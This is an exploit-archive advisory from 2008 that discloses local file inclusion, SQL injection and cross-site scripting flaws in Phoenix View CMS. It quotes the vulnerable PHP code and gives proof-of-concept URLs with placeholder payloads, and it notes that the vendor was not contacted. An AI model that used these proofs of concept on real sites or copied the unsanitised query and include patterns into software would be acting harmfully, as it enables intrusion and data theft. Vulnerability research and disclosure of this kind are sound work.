<html><head><title>Phoenix View CMS <= Pre Alpha2 (SQL/LFI/XSS) Multiple Vulnerabilities</title></head><pre>#########################################################################################
Phoenix View CMS &lt;= Pre Alpha2 Multiple Vulnerabilities [LFI][SQLI][XSS]
#########################################################################################

Found by         : tw8
Date             : 8.05.2008
Website &amp;&amp; Forum : http://rstzone.org &amp;&amp; http://rstzone.org/forum/
Bug type         : LFI, SQLI &amp; XSS
#########################################################################################

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application   : Phoenix View CMS
Version       : &lt;= Pre Alpha2
Vendor        : http://sourceforge.net/projects/phoenixviewcms/
Description   :

Phoenix View CMS is going to be an easy to use Content-Managemen-System. It's using a
self-written Template-Engine. The CMS will use a self-written API and it's gonna be
easy to write your own plugins and modules.
########################################################################################

Vulnerabilities:
~~~~~~~~~~~~~~~

Vulnerable code #1 in admin/admin_frame.php [LFI]+[XSS]:

----------------------------------------------------------------------------
[code]

	if(isset($_GET[&quot;ltarget&quot;])) {
	$ltarget=$_GET[&quot;ltarget&quot;];
	$_SESSION[&quot;lastsecaction&quot;]='';
}
......
	if(!file_exists(SYSTEM_ADMIN_path . &quot;/&quot; . $ltarget . &quot;.php&quot;)) {
		printError(&quot;System Admin Seite \&quot;&quot; . $ltarget . &quot;\&quot; wurde nicht gefunden.&quot;);
	}
	else {
		include SYSTEM_ADMIN_path . $ltarget . &quot;.php&quot;;
	}

  
[/code]
----------------------------------------------------------------------------
 
 POC #1:
 
 http://www.target.com/path/admin/admin_frame.php?ltarget=[LOCAL FILE]%00
 http://www.target.com/path/admin/admin_frame.php?ltarget=[XSS]
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Vulnerable code #2 admin/module/*.php [SQLI]:

----------------------------------------------------------------------------
[code]

	class db {
	
......
	
	function query($query,$ressave=false) {
		if($ressave) return mysql_query($query);
		else {
			$this-&gt;res = mysql_query($query);
			return $this-&gt;res;
		}
	}
......
}
......
	
	 if(isset($_GET[&quot;del&quot;])) {
	$db-&gt;query(&quot;DELETE from &quot; . SYSTEM_dbpref . &quot;todo where id='&quot;.$_GET[&quot;del&quot;].&quot;'&quot;);
	echo &quot;&lt;font color='green'&gt;LÃ¶schen erfolgreich&lt;/font&gt;&lt;br /&gt;\n&quot;;
}

/*Vulnerable files:
gbuch.admin.php
links.admin.php
menue.admin.php
news.admin.php
todo.admin.php
*/
	
  
[/code]
----------------------------------------------------------------------------
 
 POC #2:
 
 http://www.target.com/path/admin/module/vulnerable_file.php?del=[SQLI]
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Vulnerable code #3 admin/module/*.php [XSS]:

----------------------------------------------------------------------------
[code]

	&lt;input type='hidden' name='conf' value='&lt;?php if(isset($_GET[&quot;conf&quot;])) echo $_GET[&quot;conf&quot;];else echo $_POST[&quot;conf&quot;]; ?&gt;' /&gt;

/*Vulnerable files:
gbuch.admin.php
links.admin.php
menue.admin.php
news.admin.php
todo.admin.php
*/
	
  
[/code]
----------------------------------------------------------------------------
 
 POC #3:
 
 http://www.target.com/path/admin/module/vulnerable_file.php?conf=[XSS]
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Status:
~~~~~~~

Vendor has not been contacted yet.

###########################################################################

Shoutz to vladiii, kw3rln, Nemessis, Kenpachi, Moubik, DranaXum, Inside, str0ke &amp; all RST Members.

###########################################################################

Contact:
~~~~~~~

     Website: http://rstzone.org
	 Forum: http://rstzone.org/forum
     E-Mail: ym_tw8[at]yahoo[dot]com


################################ [ EOF ] ##################################

# milw0rm.com [2008-05-09]</pre></html>